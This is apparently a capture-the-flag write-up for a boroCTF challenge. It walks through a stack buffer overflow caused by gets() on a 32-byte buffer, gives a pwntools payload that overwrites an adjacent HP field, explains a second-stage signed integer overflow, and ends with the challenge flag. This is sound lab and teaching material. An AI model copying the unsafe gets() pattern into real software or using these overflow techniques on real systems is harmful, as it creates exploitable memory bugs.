# Jin Sakai

## Description

The Eagle's curse has completely made him go mad...

Once a hero of Tshushima, now a bloodthirsty warrior.

Please put an end to this madness.

```text
nc w4owkcjzvv0e.boroctf.com 53217
```

## Solution Walkthrough

1. **Step 1**:

    First, look at boss.c:

    ```c
    struct GameState {
        char buffer[32];
        int samurai_hp;
    };

    void fight_phase1() {
        struct GameState state;
        state.samurai_hp = 999;

        gets(state.buffer);

        if (state.samurai_hp <= 0) {
            printf("TRANSITION|\n");
        } else {
            printf("DIE|\n");
            exit(0);
        }
    }
    ```

    The buffer is only 32 bytes, but it uses gets(), so you can overflow into the subsequent samurai_hp:

    ```python
    p.sendline(b"A" * 32 + p32(0))
    ```

2. **Step 2**:

    Entering the second stage, the boss's HP becomes:

    ```c
    int samurai_hp = INT_MAX;
    ```

    Which is 2147483647, while observing the win condition:

    ```c
    if (samurai_hp == INT_MIN) {
        printf("WIN|\n");
        // print flag
    }
    ```

    So, you just need to figure out how to overflow it into INT_MIN.

    At this point, adding 1 to INT_MAX will cause an overflow to INT_MIN, so perform the following operation:

    ```text
    Use Item
    Health Potion
    Target The Beast
    amount = 1
    ```

    You can then get the flag.

## Flag

```text
boroCTF{gh0st_0f_3xpl01t4t10n}
```
